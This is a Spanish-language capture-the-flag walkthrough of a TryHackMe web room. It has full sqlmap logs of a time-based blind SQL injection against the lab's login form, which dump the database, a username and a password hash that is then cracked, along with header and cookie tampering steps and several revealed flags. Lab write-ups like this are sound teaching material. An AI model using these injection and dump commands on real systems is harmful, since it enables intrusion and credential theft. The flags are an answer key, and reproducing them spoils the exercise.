---
layout: single
title: CTF collection Vol.2
excerpt: "Sharpening up your CTF skill with the collection. The second volume is about web-based CTF"
date: 2022-07-02
classes: wide
header:
  teaser: /assets/images/thm-writeup-ctf-vol2/ctf2_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Linux
  - nmap
  - Burp Suite
  - Web
  - Reverse Shell
  - Privilege escalation
---

![logo](/assets/images/thm-writeup-ctf-vol2/ctf2_logo.png)

- Link: <https://tryhackme.com/room/ctfcollectionvol2>

Welcome, welcome and welcome to another CTF collection. This is the second installment of the CTF collection series. For your information, the second serious focuses on the web-based challenge. There are a total of 20 easter eggs a.k.a flags can be found within the box. Let see how good is your CTF skill.

Now, deploy the machine and collect the eggs!

Warning: The challenge contains seizure images and background. If you feeling uncomfortable, try removing the background on <style> tag.

Note: All the challenges flag are formatted as THM{flag}, unless stated otherwise

---

## Easter 1-> hint: (Check the robots)

Revisando el directorio **"robots.txt"** y en esta ruta encontramos el siguiente contenido:

![flag1](/assets/images/thm-writeup-ctf-vol2/ctf2_flag1.png)

Se observa que la fila final esta en sestema hexadecimal, cadena que decodificamos en <https://gchq.github.io/CyberChef/> obteniendo el **Easter 1**

![flag1](/assets/images/thm-writeup-ctf-vol2/ctf2_flag1-.png)

---

## Easter 2 -> <https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/>

Decodificamos la primera línea en cyberchef <https://gchq.github.io/CyberChef/> obteniendo el **Easter 2**, de acuerdo con la siguiente secuencia:

~~~cs
From Base64
URL Decode
From Base64
Remove whitespace
From Base64
Remove whitespace
From Base64
~~~

![flag2](/assets/images/thm-writeup-ctf-vol2/ctf2_flag2.png)

Revisando el código de la página, se encuentra la bandera correspondiente:

![flag2](/assets/images/thm-writeup-ctf-vol2/ctf2_flag3.png)

---

## Easter 3 -> **Directory buster with common.txt might help.**

Con base en la ayuda realizamos una búsqueda con **gobuster**:

~~~cs
gobuster dir -u http://10.10.174.164/ -w /usr/share/dirb/wordlists/common.txt
~~~

![flag3](/assets/images/thm-writeup-ctf-vol2/ctf2_flag4.png)

Revisamos el código de la página **/login** y encontramos el **Easter 3**:

![flag3](/assets/images/thm-writeup-ctf-vol2/ctf2_flag4_1.png)

---

## Easter 4 -> **time-based sqli**

- Desde burpsuite, procedemos a capturar la petición **post** con datos aleatorios en los campos "Username" y "Password", guardamos esta petición con el nomnbre "post.txt"

![flag4](/assets/images/thm-writeup-ctf-vol2/ctf2_flag4_A.png)



- Utilizamos **sqlmap** para encontrar el nombre de la base de datos ejecutamos el siguiente comando; **sqlmap -r post.txt --dbs**, como se observa a continuación:


~~~sql
┌──(root㉿kali)-[/home/ocortesl/Escritorio]
└─# sqlmap -r post.txt --dbs 
        ___
       __H__                                                                                                                                                                                                                               
 ___ ___[']_____ ___ ___  {1.6.6#stable}                                                                                                                                                                                                   
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                  
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:34:15 /2022-07-10/

[11:34:15] [INFO] parsing HTTP request from 'post.txt'
[11:34:15] [INFO] resuming back-end DBMS 'mysql' 
[11:34:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=a' AND (SELECT 1604 FROM (SELECT(SLEEP(5)))wwnM) AND 'pMmd'='pMmd&password=a&submit=submit
---
[11:34:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 12.04 or 12.10 or 13.04 (Precise Pangolin or Raring Ringtail or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[11:34:15] [INFO] fetching database names
[11:34:15] [INFO] fetching number of databases
[11:34:15] [INFO] resumed: 4
[11:34:15] [INFO] resuming partial value: in
[11:34:15] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                            
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[11:34:56] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[11:34:56] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[11:35:07] [INFO] adjusting time delay to 2 seconds due to good response times
formation_schema
[11:37:08] [INFO] retrieved: THM_f0und_m3
[11:39:18] [INFO] retrieved: mysql
[11:39:59] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

[11:42:17] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.4.61'

[*] ending @ 11:42:17 /2022-07-10/
~~~

- En este punto, "Dumpeamos" las tablas base de datos con el siguiente comando: **sqlmap -r post.txt -D THM_f0und_m3 --tables** como se observa a continuación:

~~~sql
┌──(root㉿kali)-[/home/ocortesl/Escritorio]
└─# sqlmap -r post.txt -D THM_f0und_m3 --tables
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[,]_____ ___ ___  {1.6.6#stable}                                                                                                                                                                                                    
|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:02:15 /2022-07-10/

[12:02:15] [INFO] parsing HTTP request from 'post.txt'
[12:02:15] [INFO] resuming back-end DBMS 'mysql' 
[12:02:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=a' AND (SELECT 1604 FROM (SELECT(SLEEP(5)))wwnM) AND 'pMmd'='pMmd&password=a&submit=submit
---
[12:02:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Quantal Quetzal or Raring Ringtail or Precise Pangolin)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[12:02:16] [INFO] fetching tables for database: 'THM_f0und_m3'
[12:02:16] [INFO] fetching number of tables for database 'THM_f0und_m3'
[12:02:16] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
[12:02:23] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
2
[12:02:37] [INFO] retrieved: 
[12:02:42] [INFO] adjusting time delay to 2 seconds due to good response times
nothing_inside
[12:04:41] [INFO] retrieved: user
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+

[12:05:12] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.4.61'

[*] ending @ 12:05:12 /2022-07-10/
~~~

- Revisamos la estructura de la tabla "nothing_inside" con el comando: **sqlmap -r post.txt -D THM_f0und_m3 -T nothing_inside --columns**, con el siguiente resultado:

┌──(root㉿kali)-[/home/ocortesl/Escritorio]
└─# sqlmap -r post.txt -D THM_f0und_m3 -T nothing_inside --columns
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[,]_____ ___ ___  {1.6.6#stable}                                                                                                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:30:47 /2022-07-10/

[13:30:47] [INFO] parsing HTTP request from 'post.txt'
[13:30:47] [INFO] resuming back-end DBMS 'mysql' 
[13:30:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=a' AND (SELECT 1604 FROM (SELECT(SLEEP(5)))wwnM) AND 'pMmd'='pMmd&password=a&submit=submit
---
[13:30:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.10 or 12.04 (Quantal Quetzal or Raring Ringtail or Precise Pangolin)
web application technology: PHP 5.3.10, Apache 2.2.22
back-end DBMS: MySQL >= 5.0.12
[13:30:48] [INFO] fetching columns for table 'nothing_inside' in database 'THM_f0und_m3'
[13:30:48] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
[13:30:55] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
1
[13:31:12] [INFO] retrieved: 
[13:31:23] [INFO] adjusting time delay to 2 seconds due to good response times
Easter_4
[13:32:24] [INFO] retrieved: varchar(30)
Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+

[13:33:49] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.4.61'

[*] ending @ 13:33:49 /2022-07-10/

- De acuerdo con el paso anterior, se encontró un solo campo **Easter_4**, el cual procedemos a "dumpear" con el siguiente comando; **sqlmap -r post.txt -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"**

┌──(root㉿kali)-[/home/ocortesl/Escritorio]
└─# sqlmap -r post.txt -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[)]_____ ___ ___  {1.6.6#stable}                                                                                                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:37:59 /2022-07-10/

[13:37:59] [INFO] parsing HTTP request from 'post.txt'
[13:37:59] [INFO] resuming back-end DBMS 'mysql' 
[13:37:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=a' AND (SELECT 1604 FROM (SELECT(SLEEP(5)))wwnM) AND 'pMmd'='pMmd&password=a&submit=submit
---
[13:37:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 12.04 or 13.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: PHP 5.3.10, Apache 2.2.22
back-end DBMS: MySQL >= 5.0.12
[13:37:59] [INFO] fetching SQL SELECT statement query output: 'select Easter_4 from nothing_inside'
[13:37:59] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
[13:38:06] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
1
[13:38:17] [INFO] retrieved: 
[13:38:27] [INFO] adjusting time delay to 2 seconds due to good response times
THM{1nj3c7_l1k3_4_b055}
select Easter_4 from nothing_inside: 'THM{1nj3c7_l1k3_4_b055}'
[13:41:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.4.61'


---
## Easter 5 -> **Another sqli**

- Trabajando con la misma base de datos del punto anterior y sabiendo que existe una tabla "user" procedemos a dumpearla con el siguiente comando; **sqlmap -r post.txt -D THM_f0und_m3 -T user --columns**

┌──(root㉿kali)-[/home/ocortesl/Escritorio]
└─# sqlmap -r post.txt -D THM_f0und_m3 -T user --columns
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[)]_____ ___ ___  {1.6.6#stable}                                                                                                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:44:19 /2022-07-10/

[13:44:19] [INFO] parsing HTTP request from 'post.txt'
[13:44:19] [INFO] resuming back-end DBMS 'mysql' 
[13:44:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=a' AND (SELECT 1604 FROM (SELECT(SLEEP(5)))wwnM) AND 'pMmd'='pMmd&password=a&submit=submit
---
[13:44:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 12.04 or 13.04 or 12.10 (Raring Ringtail or Quantal Quetzal or Precise Pangolin)
web application technology: PHP 5.3.10, Apache 2.2.22
back-end DBMS: MySQL >= 5.0.12
[13:44:20] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
[13:44:20] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
[13:44:27] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[13:45:13] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
2
[13:45:19] [INFO] retrieved: 
[13:45:24] [INFO] adjusting time delay to 2 seconds due to good response times
username
[13:46:19] [INFO] retrieved: varchar(30)
[13:47:45] [INFO] retrieved: password
[13:48:52] [INFO] retrieved: varchar(40)
Database: THM_f0und_m3
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(40) |
| username | varchar(30) |
+----------+-------------+

[13:50:18] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.4.61'

[*] ending @ 13:50:18 /2022-07-10/

- Llegados a este punto procedemos a dumpear el contenido, con el siguiente comando; **sqlmap -r post.txt -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"**

┌──(root㉿kali)-[/home/ocortesl/Escritorio]
└─# sqlmap -r post.txt -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[,]_____ ___ ___  {1.6.6#stable}                                                                                                                                                                                                    
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:56:57 /2022-07-10/

[13:56:57] [INFO] parsing HTTP request from 'post.txt'
[13:56:57] [INFO] resuming back-end DBMS 'mysql' 
[13:56:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=a' AND (SELECT 1604 FROM (SELECT(SLEEP(5)))wwnM) AND 'pMmd'='pMmd&password=a&submit=submit
---
[13:56:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Precise Pangolin or Quantal Quetzal or Raring Ringtail)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[13:56:57] [INFO] fetching SQL SELECT statement query output: 'select username,password from user'
[13:56:57] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
[13:56:57] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
[13:57:05] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[14:00:20] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
2
the SQL query provided can return 2 entries. How many entries do you want to retrieve?
[a] All (default)
[#] Specific number
[q] Quit
> a
[14:00:37] [INFO] retrieved: 
[14:00:42] [INFO] adjusting time delay to 2 seconds due to good response times
DesKel
[14:01:31] [INFO] retrieved: 05f3672ba34409136aa71b8d00070d1b
[14:05:41] [INFO] retrieved: Skidy
[14:06:20] [INFO] retrieved: He is a nice guy, say hello for me
select username,password from user [2]:
[*] DesKel, 05f3672ba34409136aa71b8d00070d1b
[*] Skidy, He is a nice guy, say hello for me

[14:11:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.4.61'

[*] ending @ 14:11:19 /2022-07-10/


- Crakeamos el hash;**DesKel, 05f3672ba34409136aa71b8d00070d1b** encontrado en -> <https://crackstation.net/> y obtenemos el siguiente resultado:

![flag4](/assets/images/thm-writeup-ctf-vol2/ctf2_flag5.png)

- Con el usuario y contraseña encontrados en los puntos anteriores, procedemos a autenticarnos en la página "/login" y obtenemos la bandera correspondiente a este punto.

---

## Easter 6 -> **Look out for the response header.**

- Ejecutamos el siguiente comando; **curl -s 10.10.4.61 -D header.txt**

~~~sql
┌──(root㉿kali)-[/home/ocortesl/Documentos/THM/CTF2]
└─# curl -s 10.10.4.61 -D header.txt
<!DOCTYPE html>
<html>
                <head>
                <title>360 No Scope!</title>
                <h1>Let's get party! Erm....mmmmmmmmmmm</h1>
                <script src="jquery-9.1.2.js"></script>
                 <style>
                        body {
                                background-image: url('static.gif');
                                }
                </style> 
                <img src="rainbow-frog.gif"/><img src="rainbow-frog.gif"/><img src="rainbow-frog.gif"/>
        </head>

        <body>
                <h2>DID you know: Banging your head against a wall for one hour burns 150 calories.</h2>
                                        <p><img src="who.gif"/></p>
                        <h2> Who are you? Did I invite you?</h2>
                        <hr><hr><hr><hr><hr><hr><hr>
        <p>Psst....psst.. hey dude.......do you have extra cash</p>
        <p>Please buy me one iphone 11....I'm poor, link down below.</p>
                        <h4>You need Safari 13 on iOS 13.1.2 to view this message. If you are rich enough</h4>
                <a href="https://www.apple.com/iphone-11/"><img src="iphone.jpg"/></a>
        <br><br>
        <img src="nicole.gif"/><img src="nicole.gif"/><img src="nicole.gif"/><img src="nicole.gif"/>
        <br>
        <h3>Spin me right now, spin me right now</h3>
        <h1>Ohhhhhh... Did you subsribe to Tryhackme? Is a great platform<h1>
        <h3>Thanks to them, I able to make this so call 'weird' room!!!!!!!<h3>
        <a href="/free_sub"><h2>Btw, I got a free gift for you, Perhaps a subscription voucher. Claim now!</h2></a>
        <hr><hr><hr><hr>
        <h3>Is dinner time boiiiiiiiii</h3>
        <img src="dinner.gif"/>
        <h2>Let see the menu, huh..............</h2>
        <form method="POST">
        <select name="dinner">
                 <option value="salad">salad</option>
                 <option value="chicken sandwich">chicken sandwich</option>
                 <option value="tyre">tyre</option>
                 <option value="DesKel">DesKel</option>
        </select>
         <br><br><br>
                 <button name="submit" value="submit">Take it!</button>
        </form>

                <h1 style="color:red"">Press this button if you wishes to watch the world burn!!!!!!!!!!!!!!!!<h1>...

~~~

- Listamos el archivo **header.txt** y encontramos la bandera 6:

~~~sql
┌──(root㉿kali)-[/home/ocortesl/Documentos/THM/CTF2]
└─# cat header.txt                  
HTTP/1.1 200 OK
Date: Sun, 10 Jul 2022 19:03:13 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
Set-Cookie: Invited=0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html
~~~

---

## Easter 7 -> **Cookie is delicious**

- Mediante Burp analizamos el "header" y encontramos una "kookie" con valor = 0:

![flag7](/assets/images/thm-writeup-ctf-vol2/ctf2_flag7.png)


- Enviamos esta petición al "repeater" y cambiamos el valor de la "kookie" = 1, enviamos la petición y encontramos "Easter 7":

![flag7](/assets/images/thm-writeup-ctf-vol2/ctf2_flag7_1.png)

---

## Easter 8 -> **Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1**

- De acuerdo con la pista, cambiamos el "User-Agent":

![flag8](/assets/images/thm-writeup-ctf-vol2/ctf2_flag8.png)


- Obteniendo la bandera correspondiente:

![flag8](/assets/images/thm-writeup-ctf-vol2/ctf2_flag8_1.png)


## Easter 9 -> **Something is redirected too fast. You need to capture it.**

- Con el siguiente comando encontramos el "Easter 9":


~~~bash
# curl http://10.10.4.61/ready/
<html>
        <head>
                <title>You just press it</title>
                <meta http-equiv="refresh" content="3;url=http:gone.php" />
                <p style="text-align:center"><img src="bye.gif"/></p>
                <!-- Too fast, too good, you can't catch me. I'm sanic Easter 9: THM{????????????} -->
        </head>

</html>

~~~

---

## Easter 10 -> **Look at THM URL without https:// and use it as a referrer.**

- Buscando "Tryhackme" en el código del "home", encontramos la siguiente ruta; **/fre_sub**:

![flag10](/assets/images/thm-writeup-ctf-vol2/ctf2_flag9.png)

- Realizamos curl sobre esta ruta y encontramos el siguiente mensaje:

~~~bash
└─# curl http://10.10.4.61/free_sub/                 
only people came from tryhackme are allowed to claim the voucher.
~~~

- De acuerdo con la pista modificamos el "referer" utilizando "tryhackme.com" y encotramos el "Easter 10"

![flag10](/assets/images/thm-writeup-ctf-vol2/ctf2_flag10.png)

ctf2_flag10.png

---

## Easter 11 -> ** Temper the html.**

- Revisamos en el "home" y encontramos este apartado "Is dinner time boiiiiiiiii" en el cual podemos escoger la cena, la respuesta al seleccionar "salad" es: **Mmmmmm... what a healthy choice, I prefer an egg**:


![flag11](/assets/images/thm-writeup-ctf-vol2/ctf2_flag11.png)

- Enviamos la solicitud al "repeater" y modificamos el menu por "egg" y encontramos el "Easter 11"

![flag11](/assets/images/thm-writeup-ctf-vol2/ctf2_flag11_1.png)

---

## Easter 12 -> **Fake js file**

- Buscando archivos ".js" en el código del home:

![flag12](/assets/images/thm-writeup-ctf-vol2/ctf2_flag12.png)

- Como se observa en el código, existe el script: **jquery-9.1.2.js**, al cual nos dirigimos:

![flag12](/assets/images/thm-writeup-ctf-vol2/ctf2_flag12_1.png)

- Decodificamos el código "From Hex" en <<"https://gchq.github.io/CyberChef/>> y encontramos el "Easter 12":

![flag12](/assets/images/thm-writeup-ctf-vol2/ctf2_flag12_2.png)

---

## Easter 13 -> **Fake js file**

- Al resolver "Easter 9" se consigue el "Easter 13":

![flag13](/assets/images/thm-writeup-ctf-vol2/ctf2_flag13.png)

---

## Easter 14 -> **Embed image code**

- Buscando en el código "Easter 14" y encontramos un código, como se observa a continuación:

![flag14](/assets/images/thm-writeup-ctf-vol2/ctf2_flag14_A.png)

- Desde cyberchef procedemos a descifrar desde base 64 y a renderizar la imagen y obtenemos el Easter 14:


![flag14](/assets/images/thm-writeup-ctf-vol2/ctf2_flag14.png)

---

## Easter 15 -> **Try guest the alphabet and the hash code**

- De acuerdo con la pista y desde burpsuite intentamos con todo el abcedario en minúscula y mayúscula como observamos a continuación:

![flag15](/assets/images/thm-writeup-ctf-vol2/ctf2_flag15_1.png)


![flag15](/assets/images/thm-writeup-ctf-vol2/ctf2_flag15.png)

a  b  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z
---
89 90 91 92 93 94 95 41 42 43 75 76 77 78 79 80 81 10 11 12 13 14 15 16 17 18

A  B   C   D   E   F   G  H  I  J  K  L  M  N  O   P   Q   R   S   T   U   V   W   X   Y   Z
---
99 100 101 102 103 104 51 52 53 54 55 56 57 58 126 127 128 129 130 131 136 137 138 139 140 141

- Con esta información procedemos a descifrar: hints: 51 89 77 93 126 14 93 10 obteniendo:

51 89 77 93 126 14 93 10
---
G  a  m  e  O   v  e  r

![flag15](/assets/images/thm-writeup-ctf-vol2/ctf2_flag15_2.png)

---

## Easter 16 -> **Make all inputs into one form.**

- Desde "game2" capturamos la petición de presionar "Button 1" y obtenemos la siguiente respuesta:

![flag16](/assets/images/thm-writeup-ctf-vol2/ctf2_flag16.png)


- Con base en lo anterior unimos las tres peticiones con la siguiente petición "button1=button1&button2=button2&button3=button3&submit=submit", como se observa a continuación obteniendo el "Easter 16":

![flag16](/assets/images/thm-writeup-ctf-vol2/ctf2_flag16_1.png)

---

## Easter 17 -> **bin -> dec -> hex -> ascii**

- Con el siguiente código en **python** obtenemos el "Easter 17":

![flag17](/assets/images/thm-writeup-ctf-vol2/ctf2_flag17.png)


~~~python
#bin -> dec -> hex -> ascii
binary = "100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101"
decimal = int(binary, 2)
print (decimal)
hexa = hex(decimal) [2:]
print (hexa)
print (bytes.fromhex(hexa).decode("ASCII"))
~~~

---

## Easter 18 -> **Request header. Format is egg:Yes**

- Modificamos la solicitud como se observa a continuación:

![flag18](/assets/images/thm-writeup-ctf-vol2/ctf2_flag18.png)

---

## Easter 19 -> **A thick dark line**

- Buscando en el código imagenes, encontramos "small.png" e ingresamos a esta, obteniendo el "easter 19"

![flag19](/assets/images/thm-writeup-ctf-vol2/ctf2_flag19.png)
![flag19](/assets/images/thm-writeup-ctf-vol2/ctf2_flag19_1.png)

---

## Easter 20 -> **You need to POST the data instead of GET. Burp suite or curl might help.**

- Revisando en el código "Easter 20" encontramos un usuario y contraseña, que cambiando el método de solicitud en "burp" de get a post y agregando la siguiente línea "username=DesKel&password=heIsDumb).", obtenemos el "Easter 20":

![flag20](/assets/images/thm-writeup-ctf-vol2/ctf2_flag20.png)

---

## Fuentes

- Cyberchef:
<https://gchq.github.io/CyberChef/>

- Writeup:
<https://www.aldeid.com/wiki/TryHackMe-CTF-collection-Vol2>

- Crackstation:
<https://crackstation.net/>